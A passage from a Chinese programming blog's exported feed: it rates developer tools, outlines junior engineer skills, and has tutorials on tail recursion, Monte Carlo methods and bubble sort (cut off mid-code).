<p><a href="http://jingyan.baidu.com/article/495ba84107885538b30edefa.html">【Navicat】：[2]怎么远程连接oracle数据库</a></p>
<h3 id="SqlDbx"><a href="#SqlDbx" class="headerlink" title="SqlDbx"></a>SqlDbx</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>SqlDbx 是简单易用的数据库管理工具。支持Oracle,Sybase ASE, IBM,DB2&#x2F;UDB,MicrosoftSQL Server,MySQL 和ODBC数据源。</p>
<h2 id="WEB开发相关"><a href="#WEB开发相关" class="headerlink" title="WEB开发相关"></a>WEB开发相关</h2><h3 id="Apache-HTTP-Server-开源"><a href="#Apache-HTTP-Server-开源" class="headerlink" title="Apache HTTP Server(开源)"></a>Apache HTTP Server(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件。</p>
<h3 id="Lighttpd-开源"><a href="#Lighttpd-开源" class="headerlink" title="Lighttpd(开源)"></a>Lighttpd(开源)</h3><ul>
<li>重要程度：★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>Lighttpd是一个德国人领导的开源Web服务器软件，其根本的目的是提供一个专门针对高性能网站，安全、快速、兼容性好并且灵活的web server环境。具有非常低的内存开销、cpu占用率低、效能好以及丰富的模块等特点。</p>
<h3 id="Nginx-开源"><a href="#Nginx-开源" class="headerlink" title="Nginx(开源)"></a>Nginx(开源)</h3><ul>
<li>重要程度：★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>Nginx是一款轻量级的Web服务器&#x2F;反向代理服务器及电子邮件(IMAP&#x2F;POP3)代理服务器。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：新浪、网易、腾讯等。</p>
<h3 id="Tomcat-开源"><a href="#Tomcat-开源" class="headerlink" title="Tomcat(开源)"></a>Tomcat(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：JAVA WEB开发</li>
</ul>
<h3 id="Jetty-开源"><a href="#Jetty-开源" class="headerlink" title="Jetty(开源)"></a>Jetty(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：JAVA WEB开发</li>
</ul>
<h2 id="开发专项工具"><a href="#开发专项工具" class="headerlink" title="开发专项工具"></a>开发专项工具</h2><h3 id="Kettle-开源"><a href="#Kettle-开源" class="headerlink" title="Kettle(开源)"></a>Kettle(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：数据抽取&#x2F;数据仓库</li>
</ul>
<p>Kettle是一款国外开源的ETL工具，纯java编写，可以在Window、Linux、Unix上运行，绿色无需安装，数据抽取高效稳定。</p>
<h3 id="Maven-开源"><a href="#Maven-开源" class="headerlink" title="Maven(开源)"></a>Maven(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：JAVA开发</li>
</ul>
<h3 id="FindBugs-开源"><a href="#FindBugs-开源" class="headerlink" title="FindBugs(开源)"></a>FindBugs(开源)</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：JAVA开发</li>
</ul>
<p>FindBugs是一个缺陷检测工具为Java使用静态分析来寻找超过200个bug模式，如空指针解引用，无限递归循环，Java库和死锁的不良用途。</p>
<p>FindBugs的可以识别在大型应用程序(通常为每1000-2000行非注释的源语句约1缺陷)数百严重缺陷。</p>
<p>FindBugs的是开源的，并且已被下载超过23万次，可以通过命令行、ant、eclipse、maven、netbeans、emacs等方式来使用。</p>
<p>简单来说，它可以帮助开发者测试出一些明显的bug，例如：缺少必要的nullcheck、多余的null check；多余的if条件，重复的代码块；错误使用&#x3D;&#x3D;进行条件判断，数据库连接、IO未关闭；无限递归、死锁等。还可以检测出写的不优雅的代码，像使用StringBuffer、StringBuilder代替字符串连接之类。注意：Findbugs是检查java字节码，也就是*.class文件。</p>
<h3 id="HUDSON"><a href="#HUDSON" class="headerlink" title="HUDSON"></a>HUDSON</h3><ul>
<li>重要程度：★★</li>
<li>学习难易：★★★</li>
<li>适合人员：代码质量管理</li>
</ul>
<p>Hudson是基于Java开发的一种持续集成工具，用于监控程序重复的工作。是一款轻量级、易扩展、易配置的持续集成平台，该集成平台maven2有良好的支持，并且扩展插件丰富，包括findbug,PMD静态分析插件、emma单元测试覆盖率插件、junit测试报告插件等等。</p>
<h3 id="Finalbuilder"><a href="#Finalbuilder" class="headerlink" title="Finalbuilder"></a>Finalbuilder</h3><ul>
<li>重要程度：★★</li>
<li>学习难易：★★★</li>
</ul>
<h2 id="开发提效工具"><a href="#开发提效工具" class="headerlink" title="开发提效工具"></a>开发提效工具</h2><h3 id="Total-Commander"><a href="#Total-Commander" class="headerlink" title="Total Commander"></a>Total Commander</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>Total Commander，简称TC，原名WindowsCommander，功能强大的全能文件管理器。</p>
<p><a href="http://jingyan.baidu.com/article/851fbc37d857553e1f15abee.html">用Total Commander批量重命名文件</a></p>
<h3 id="Remote-Desktop-Organizer-免费"><a href="#Remote-Desktop-Organizer-免费" class="headerlink" title="Remote Desktop Organizer(免费)"></a>Remote Desktop Organizer(免费)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★</li>
<li>适合人员：所有</li>
</ul>
<p>功能强劲的远程连接管理工具。</p>
<p><a href="http://jingyan.baidu.com/article/b24f6c82c091d186bfe5daaa.html">远程桌面管理工具RDO的使用方法</a></p>
<h3 id="UltraReplace-免费"><a href="#UltraReplace-免费" class="headerlink" title="UltraReplace(免费)"></a>UltraReplace(免费)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★</li>
<li>适合人员：所有</li>
</ul>
<p>功能强劲的内容批量替换工具。</p>
<p><a href="http://jingyan.baidu.com/article/0f5fb099f0d4516d8334ea1b.html">怎么用UltraReplace批量替换文件内容</a></p>
<h3 id="Beyond-Compare"><a href="#Beyond-Compare" class="headerlink" title="Beyond Compare"></a>Beyond Compare</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>功能强劲的文件、文件夹比较工具。</p>
<p><a href="http://jingyan.baidu.com/article/a17d52853450878098c8f209.html">Beyond Compare使用方法</a></p>
<h3 id="IETester-免费"><a href="#IETester-免费" class="headerlink" title="IETester(免费)"></a>IETester(免费)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★</li>
<li>适合人员：WEB开发人员</li>
</ul>
<p>IETester是一个免费的WebBrowser控件，让您有渲染和IE8的JavaScript引擎，IE7和IE6在Windows7，Vista和XP的IE5.5中，以及在同一进程中安装的IE浏览器。可以帮我们模拟网页在IE5.5、IE6、IE7、IE8、IE9以及IE10等浏览器的相容性，让我们看一下辛苦作好的CSS样式或网站版面是否可以在各个主要浏览器正常显示。</p>
<h3 id="MindjetMindManager"><a href="#MindjetMindManager" class="headerlink" title="MindjetMindManager"></a>MindjetMindManager</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>MindManager，俗称“脑图”，是一款创造、管理和交流思想的通用标准的绘图软件，界面可视化，有着直观、友好的用户界面和丰富的功能。</p>
<p>MindManager也是一个易于使用的项目管理软件，能很好提高项目组的工作效率和小组成员之间的协作性。它作为一个组织资源和管理项目的方法，可从脑图的核心分枝派生出各种关联的想法和信息。</p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="Office-Visio"><a href="#Office-Visio" class="headerlink" title="Office Visio"></a>Office Visio</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：设计&#x2F;架构人员</li>
</ul>
<p>Office Visio是一款便于IT和商务专业人员就复杂信息、系统和流程进行可视化处理、分析和交流的软件。</p>
<h3 id="ClearQuest"><a href="#ClearQuest" class="headerlink" title="ClearQuest"></a>ClearQuest</h3><ul>
<li>重要程度：★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>ClearQuest 是IBM Rational提供的缺陷及变更管理工具。它对软件缺陷或功能特性等任务记录提供跟踪管理。提供了查询定制和多种图表报表。每次查询都可以定制，以实现不同管理流程的要求。</p>
<h3 id="VMware-Workstation"><a href="#VMware-Workstation" class="headerlink" title="VMware Workstation"></a>VMware Workstation</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>VMware Workstation(中文名“威睿工作站”)是一款功能强大的桌面虚拟计算机软件，提供用户可在单一的桌面上同时运行不同的操作系统，和进行开发、测试<br>、部署新的应用程序的最佳解决方案。</p>
<h3 id="Photoshop"><a href="#Photoshop" class="headerlink" title="Photoshop"></a>Photoshop</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>Adobe Photoshop，简称“PS”，是由Adobe Systems开发和发行的图像处理软件。Photoshop主要处理以像素所构成的数字图像。使用其众多的编修与绘图工具，可以有效地进行图片编辑工作。ps有很多功能，在图像、图形、文字、视频、出版等各方面都有涉及。</p>
<h3 id="Microsoft-Project"><a href="#Microsoft-Project" class="headerlink" title="Microsoft Project"></a>Microsoft Project</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★★</li>
</ul>
<p>Microsoft Project(或MSP)是由微软开发销售的项目管理软件程序。软件设计目的在于协助项目经理发展计划、为任务分配资源、跟踪进度、管理预算和分析工作量。</p>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="批量水印大师"><a href="#批量水印大师" class="headerlink" title="批量水印大师"></a>批量水印大师</h3><p><a href="http://jingyan.baidu.com/article/d45ad14899f0d069542b807d.html">怎么用“批量水印大师”批量添加水印</a></p>
<p><a href="http://jingyan.baidu.com/article/ab69b270d674572ca6189f66.html">怎样给PDF文件添加书签目录</a></p>
<p><a href="http://jingyan.baidu.com/article/73c3ce28f4db8be50343d9ce.html">【Dreamweaver】：[1]怎么新建站点</a></p>
<p><a href="http://jingyan.baidu.com/article/335530daa4f97f19ca41c366.html">【百度云】怎样用百度云收藏工具收藏文章</a></p>
<p><a href="http://jingyan.baidu.com/article/4dc408489772abc8d846f163.html">用Office 2010的OCR功能识别图片中的文字</a></p>
<p><a href="http://jingyan.baidu.com/article/215817f7ec3ebe1eda1423a0.html">如何将扫描版PDF轮换为word</a></p>
]]></content>
      <categories>
        <category>知识体系</category>
      </categories>
      <tags>
        <tag>知识体系</tag>
      </tags>
  </entry>
  <entry>
    <title>助理软件工程师基本技能</title>
    <url>/blog/pytx/zlrjgcs/</url>
    <content><![CDATA[<h2 id="通用部分"><a href="#通用部分" class="headerlink" title="通用部分"></a>通用部分</h2><h3 id="编码规范"><a href="#编码规范" class="headerlink" title="编码规范"></a>编码规范</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>不同的语言有不同的规范，编程语言、SQL都有。熟知并遵守基本规范，如命名、注释密度、代码格式、常量定义等。</p>
<h3 id="语言基础"><a href="#语言基础" class="headerlink" title="语言基础"></a>语言基础</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>掌握开发所需语言，一般为JAVA或C&#x2F;C++。不同行业和公司用的语言是不同的，这两种是范围最大的，也有用Python的。</p>
<p>熟悉语言的基本语法、逻辑控制，以及对象体系。</p>
<h3 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>了解数据库，掌握基本的SQL语句写法。会用一种或多种数据库管理工具。</p>
<p><a href="/database/">开始学习数据库</a></p>
<h2 id="WEB方向基础"><a href="#WEB方向基础" class="headerlink" title="WEB方向基础"></a>WEB方向基础</h2><h3 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>熟悉语言的基本语法、关键字信息，能够和CSS结合，编写比较美观、复杂的网页页面。</p>
<h3 id="CSS基础"><a href="#CSS基础" class="headerlink" title="CSS基础"></a>CSS基础</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>属性(Properties)、规则(At-Rules)、伪类(Pseudo-Classes)、伪元素(Pseudo-Elements)、声明(Declarations)、单位(Units)、选择符(Selectors)等。</p>
<p><a href="/webtech/css/css2cn/">开始学习CSS</a></p>
<h3 id="JavaScript基础"><a href="#JavaScript基础" class="headerlink" title="JavaScript基础"></a>JavaScript基础</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>熟悉语言的基本语法、了解语言的对象体系，以及主要的功能特性。</p>
<p><a href="/webtech/javascript/">开始学习JavaScript</a></p>
<h2 id="JAVA-WEB方向"><a href="#JAVA-WEB方向" class="headerlink" title="JAVA WEB方向"></a>JAVA WEB方向</h2><p><a href="/webtech/j2ee/">开始学习JAVA WEB技术</a></p>
<h3 id="Tomcat基本配制"><a href="#Tomcat基本配制" class="headerlink" title="Tomcat基本配制"></a>Tomcat基本配制</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★</li>
<li>适合人员：JAVA WEB开发</li>
</ul>
<p>开发中常用的中间件，熟练使用Tomcat，要会多种方式部署WEB应用。</p>
<h3 id="JSP-x2F-Servlet基础"><a href="#JSP-x2F-Servlet基础" class="headerlink" title="JSP&#x2F;Servlet基础"></a>JSP&#x2F;Servlet基础</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：JAVA WEB开发</li>
</ul>
<p>熟悉Servlet&#x2F;JSP的书写方法，了解决JSP和Servlet的关系，会搭建JAVA<br>WEB项目。</p>
]]></content>
  </entry>
  <entry>
    <title>递归和尾递归详解</title>
    <url>/blog/algorithm/other/wdg/</url>
    <content><![CDATA[<h2 id="1、递归"><a href="#1、递归" class="headerlink" title="1、递归"></a>1、递归</h2><p>关于递归的概念，我们都不陌生。简单的来说递归就是一个函数直接或间接地调用自身，是为直接或间接递归。一般来说，递归需要有边界条件、递归前进段和递归返回段。当边界条件不满足时，递归前进；当边界条件满足时，递归返回。用递归需要注意以下两点：</p>
<ol>
<li>递归就是在过程或函数里调用自身。</li>
<li>在使用递归策略时，必须有一个明确的递归结束条件，称为递归出口。</li>
</ol>
<p>递归一般用于解决三类问题：</p>
<ol>
<li>数据的定义是按递归定义的。（Fibonacci函数，n的阶乘）</li>
<li>问题解法按递归实现。（回溯）</li>
<li>数据的结构形式是按递归定义的。（二叉树的遍历，图的搜索）</li>
</ol>
<p>递归的缺点：</p>
<p>递归解题相对常用的算法如普通循环等，运行效率较低。因此，应该尽量避免使用递归，除非没有更好的算法或者某种特定情况，递归更为适合的时候。在递归调用的过程当中系统为每一层的返回点、局部量等开辟了栈来存储，因此递归次数过多容易造成栈溢出。</p>
<p>用线性递归实现Fibonacci函数，程序如下所示：</p>
<pre><code>int FibonacciRecursive(int n)
&#123;
    if( n &lt; 2)
        return n;
    return (FibonacciRecursive(n-1)+FibonacciRecursive(n-2));
&#125;
</code></pre>
<p>递归写的代码非常容易懂，完全是根据函数的条件进行选择计算机步骤。例如现在要计算n&#x3D;5时的值，递归调用过程如下图所示：</p>
<p><img src="/images/algorithm/wdg1.png"></p>
<h2 id="2、尾递归"><a href="#2、尾递归" class="headerlink" title="2、尾递归"></a>2、尾递归</h2><p>顾名思义，尾递归就是从最后开始计算, 每递归一次就算出相应的结果,也就是说, 函数调用出现在调用者函数的尾部, 因为是尾部,所以根本没有必要去保存任何局部变量. 直接让被调用的函数返回时越过调用者,返回到调用者的调用者去。尾递归就是把当前的运算结果（或路径）放在参数里传给下层函数，深层函数所面对的不是越来越简单的问题，而是越来越复杂的问题，因为参数里带有前面若干步的运算路径。</p>
<p>尾递归是极其重要的，不用尾递归，函数的堆栈耗用难以估量，需要保存很多中间函数的堆栈。比如f(n,sum) &#x3D; f(n-1) + value(n) + sum; 会保存n个函数调用堆栈，而使用尾递归f(n,sum) &#x3D; f(n-1, sum+value(n));</p>
<p>这样则只保留后一个函数堆栈即可，之前的可优化删去。</p>
<p>采用尾递归实现Fibonacci函数，程序如下所示：</p>
<pre><code> int FibonacciTailRecursive(int n,int ret1,int ret2)
&#123;
   if(n==0)
      return ret1; 
    return FibonacciTailRecursive(n-1,ret2,ret1+ret2);
&#125;
</code></pre>
<p>例如现在要计算n&#x3D;5时的值，尾递归调用过程如下图所示：</p>
<p><img src="/images/algorithm/wdg2.png"></p>
<p>从图可以看出，为递归不需要向上返回了，但是需要引入而外的两个空间来保持当前的结果。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>尾递归</tag>
      </tags>
  </entry>
  <entry>
    <title>软件开发专题技术</title>
    <url>/blog/pytx/ztjs/</url>
    <content><![CDATA[<h2 id="通用部分"><a href="#通用部分" class="headerlink" title="通用部分"></a>通用部分</h2><h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>深入了解字符集相关知识，能解决开发中的各种乱码问题。</p>
<p><a href="/topic/charset/" title="字符集学习笔记">字符集学习笔记</a></p>
<h3 id="多线程编程与线程安全"><a href="#多线程编程与线程安全" class="headerlink" title="多线程编程与线程安全"></a>多线程编程与线程安全</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>能熟练地进行多线程编程，有效解决同步问题。</p>
<p><a href="/plang/java/superjava/threadsafe/" title="JAVA多线程与线程安全">JAVA多线程与线程安全</a></p>
<h3 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>能熟练地进行基础TCP&#x2F;IP协议的SOCKET网络编码，了解HTTP、FTP等常用的网络协议，能使用常用的编程语言进行HTTP、FTP客户端开发。</p>
<p>有基于TCP&#x2F;IP协议，设计简单的应用协议，完成业务需求。</p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>熟练书写常用正则表达式，熟练使用开发语言的正则表达式库。</p>
<h3 id="Office编程"><a href="#Office编程" class="headerlink" title="Office编程"></a>Office编程</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>利用对应库或包对word、excel文件内容进行编辑，java主要用jacob和poi。</p>
<p><a href="/plang/java/lib/jacob/jacobbase.htm">JACOB使用简介</a></p>
<p><a href="/plang/java/lib/jacob/jacobcode.htm">jacob操作word接口api</a></p>
<p>测试源码包：</p>
<p>链接: <a href="http://pan.baidu.com/s/1mg9tsZA">http://pan.baidu.com/s/1mg9tsZA</a></p>
<p>密码: ej9u</p>
<h2 id="WEB专题技术"><a href="#WEB专题技术" class="headerlink" title="WEB专题技术"></a>WEB专题技术</h2><h3 id="WebService"><a href="#WebService" class="headerlink" title="WebService"></a>WebService</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<h3 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★</li>
<li>适合人员：WEB开发</li>
</ul>
<h3 id="jquery"><a href="#jquery" class="headerlink" title="jquery"></a>jquery</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<h3 id="htmlunit"><a href="#htmlunit" class="headerlink" title="htmlunit"></a>htmlunit</h3><ul>
<li>重要程度：★★</li>
<li>学习难易：★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>htmlunit 是一款开源的java页面分析工具，读取页面后，可以有效的使用htmlunit分析页面上的内容。项目可以模拟浏览器运行，被誉为java浏览器的开源实现。这个没有界面的浏览器，运行速度也是非常迅速的。</p>
<p>常规意义上，该项目可以用来进行页面的测试工作，实现网页自动化测试，（包括JS）但是一般来说，在小型爬虫项目中，这种框架十分常用，可以有效的分析出dom的标签，并且有效的运行页面上的js以便得到一些需要执行JS才能得到的值。</p>
<p><a href="/plang/java/lib/htmlunit/xueqiuspider.htm">一个用来抓取雪球数据的程序示例</a></p>
<h2 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h2><h3 id="NOSQL"><a href="#NOSQL" class="headerlink" title="NOSQL"></a>NOSQL</h3><p><a href="/nosql/mongodb/mongodbdiary/" title="MongoDB学习笔记">MongoDB学习笔记</a></p>
<h2 id="数据挖掘方向"><a href="#数据挖掘方向" class="headerlink" title="数据挖掘方向"></a>数据挖掘方向</h2><h3 id="数据仓库"><a href="#数据仓库" class="headerlink" title="数据仓库"></a>数据仓库</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：数据挖掘</li>
</ul>
<p>了解ETL过程，并能进行开发，能根据主题创建事实表和维表</p>
<h3 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：数据挖掘</li>
</ul>
<p>了解基本的数据挖掘算法，对简单的算法了解其应用场景。</p>
]]></content>
  </entry>
  <entry>
    <title>蒙特卡罗方法入门</title>
    <url>/blog/algorithm/other/monte-carlo-method/</url>
    <content><![CDATA[<p>本文通过五个例子，介绍蒙特卡罗方法（Monte Carlo Method）。</p>
<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>蒙特卡罗方法是一种计算方法。原理是通过大量随机样本，去了解一个系统，进而得到所要计算的值。</p>
<p>它非常强大和灵活，又相当简单易懂，很容易实现。对于许多问题来说，它往往是最简单的计算方法，有时甚至是唯一可行的方法。</p>
<p><img src="/images/algorithm/mtklrm1.jpg"></p>
<p>它诞生于上个世纪40年代美国的&quot;曼哈顿计划&quot;，名字来源于赌城蒙特卡罗，象征概率。</p>
<h2 id="二、π的计算"><a href="#二、π的计算" class="headerlink" title="二、π的计算"></a>二、π的计算</h2><p>第一个例子是，如何用蒙特卡罗方法计算圆周率π。</p>
<p>正方形内部有一个相切的圆，它们的面积之比是π&#x2F;4。</p>
<p><img src="/images/algorithm/mtklrm2.jpg"></p>
<p><img src="/images/algorithm/mtklrm3.jpg"></p>
<p>现在，在这个正方形内部，随机产生10000个点（即10000个坐标对 (x,<br>y)），计算它们与中心点的距离，从而判断是否落在圆的内部。</p>
<p><img src="/images/algorithm/mtklrm4.jpg"></p>
<p>如果这些点均匀分布，那么圆内的点应该占到所有点的<br>π&#x2F;4，因此将这个比值乘以4，就是π的值。通过R语言脚本随机模拟30000个点，π的估算值与真实值相差0.07%。</p>
<h2 id="三、积分的计算"><a href="#三、积分的计算" class="headerlink" title="三、积分的计算"></a>三、积分的计算</h2><p>上面的方法加以推广，就可以计算任意一个积分的值。</p>
<p><img src="/images/algorithm/mtklrm5.gif"></p>
<p>比如，计算函数 y &#x3D; x^2^ 在 [0, 1]<br>区间的积分，就是求出下图红色部分的面积。</p>
<p><img src="/images/algorithm/mtklrm6.jpg"></p>
<p>这个函数在 (1,1)<br>点的取值为1，所以整个红色区域在一个面积为1的正方形里面。在该正方形内部，产生大量随机点，可以计算出有多少点落在红色区域（判断条件<br>y &lt; x^2^）。这个比重就是所要求的积分值。</p>
<p>用Matlab模拟100万个随机点，结果为0.3328。</p>
<h2 id="四、交通堵塞"><a href="#四、交通堵塞" class="headerlink" title="四、交通堵塞"></a>四、交通堵塞</h2><p>蒙特卡罗方法不仅可以用于计算，还可以用于模拟系统内部的随机运动。下面的例子模拟单车道的交通堵塞。</p>
<p>根据 Nagel-Schreckenberg 模型，车辆的运动满足以下规则。</p>
<blockquote>
<ul>
<li>当前速度是 v 。</li>
<li>如果前面没车，它在下一秒的速度会提高到 v + 1<br>，直到达到规定的最高限速。</li>
<li>如果前面有车，距离为d，且 d &lt; v，那么它在下一秒的速度会降低到 d -<br>1 。</li>
<li>此外，司机还会以概率 p 随机减速， 将下一秒的速度降低到 v - 1 。</li>
</ul>
</blockquote>
<p>在一条直线上，随机产生100个点，代表道路上的100辆车，另取概率 p 为 0.3 。</p>
<p><img src="/images/algorithm/mtklrm7.png"></p>
<p>上图中，横轴代表距离（从左到右），纵轴代表时间（从上到下），因此每一行就表示下一秒的道路情况。</p>
<p>可以看到，该模型会随机产生交通拥堵（图形上黑色聚集的部分）。这就证明了，单车道即使没有任何原因，也会产生交通堵塞。</p>
<h2 id="五、产品厚度"><a href="#五、产品厚度" class="headerlink" title="五、产品厚度"></a>五、产品厚度</h2><p>某产品由八个零件堆叠组成。也就是说，这八个零件的厚度总和，等于该产品的厚度。</p>
<p><img src="/images/algorithm/mtklrm8.jpg"></p>
<p>已知该产品的厚度，必须控制在27mm以内，但是每个零件有一定的概率，厚度会超出误差。请问有多大的概率，产品的厚度会超出27mm？</p>
<p><img src="/images/algorithm/mtklrm9.png"></p>
<p>取100000个随机样本，每个样本有8个值，对应8个零件各自的厚度。计算发现，产品的合格率为99.9979%，即百万分之21的概率，厚度会超出27mm。</p>
<h2 id="六、证券市场"><a href="#六、证券市场" class="headerlink" title="六、证券市场"></a>六、证券市场</h2><p>证券市场有时交易活跃，有时交易冷清。下面是你对市场的预测。</p>
<ul>
<li>如果交易冷清，你会以平均价11元，卖出5万股。</li>
<li>如果交易活跃，你会以平均价8元，卖出10万股。</li>
<li>如果交易温和，你会以平均价10元，卖出7.5万股。</li>
</ul>
<p>已知你的成本在每股5.5元到7.5元之间，平均是6.5元。请问接下来的交易，你的净利润会是多少？</p>
<p>取1000个随机样本，每个样本有两个数值：一个是证券的成本（5.5元到7.5元之间的均匀分布），另一个是当前市场状态（冷清、活跃、温和，各有三分之一可能）。</p>
<p><img src="/images/algorithm/mtklrm10.png"></p>
<p>模拟计算得到，平均净利润为92, 427美元。</p>
<p>转自：<a href="http://www.ruanyifeng.com/blog/2015/07/monte-carlo-method.html">http://www.ruanyifeng.com/blog/2015/07/monte-carlo-method.html</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>冒泡排序</title>
    <url>/blog/algorithm/sort/bubsort/</url>
    <content><![CDATA[<p><img src="/images/sort/bsort.gif"></p>
<h2 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h2><p>在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。</p>
<p>冒泡排序的示例：</p>
<p><img src="/images/sort/bubsort.jpg"></p>
<h2 id="算法的实现："><a href="#算法的实现：" class="headerlink" title="算法的实现："></a>算法的实现：</h2><pre><code>void bubbleSort(int a[], int n)&#123;
    for(int i =0 ; i&lt; n-1; ++i) &#123;
        for(int j = 0; j &lt; n-i-1; ++j) &#123;
            if(a[j] &gt; a[j+1])
            &#123;
                int tmp = a[j] ; a[j] = a[j+1] ;  a[j+1] = tmp;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="冒泡排序算法的改进"><a href="#冒泡排序算法的改进" class="headerlink" title="冒泡排序算法的改进"></a>冒泡排序算法的改进</h2><p>对冒泡排序常见的改进方法是加入一标志性变量exchange，用于标志某一趟排序过程中是否有数据交换，如果进行某一趟排序时并没有进行数据交换，则说明数据已经按要求排列好，可立即结束排序，避免不必要的比较过程。本文再提供以下两种改进算法：</p>
<p>1．设置一标志性变量pos,用于记录每趟排序中最后一次进行交换的位置。由于pos位置之后的记录均已交换到位,故在进行下一趟排序时只要扫描到pos位置即可。</p>
<p>改进后算法如下:</p>
<pre><code>void Bubble_1 ( int r[], int n) &#123;
    int i= n -1;  //初始时,最后位置保持不变
    while ( i&gt; 0) &#123;
        int pos= 0; //每趟开始时,无记录交换
        for (int j= 0; j&lt; i; j++)
            if (r[j]&gt; r[j+1]) &#123;
                pos= j; //记录交换的位置
                int tmp = r[j]; r[j]=r[j+1];r[j+1]=tmp;
            &#125;
        i= pos; //为下一趟排序作准备
     &#125;
&#125;
</code></pre>
<p>2．传统冒泡排序中每一趟排序操作只能找到一个最大值或最小值,我们考虑利用在每趟排序中进行正向和反向两遍冒泡的方法一次可以得到两个最终值(最大者和最小者), 从而使排序趟数几乎减少了一半。</p>
<p>改进后的算法实现为:</p>
<pre><code> void Bubble_2 ( int r[], int n)&#123;
    int low = 0;
    int high= n -1; //设置变量的初始值
    int tmp,j;
    while (low &lt; high) &#123;
        for (j= low; j &lt; high; ++j) //正向冒泡,找到最大者
            if (r[j] &gt; r[j+1]) &#123;
                tmp = r[j]; r[j]=r[j+1];r[j+1]=tmp;
            &#125;
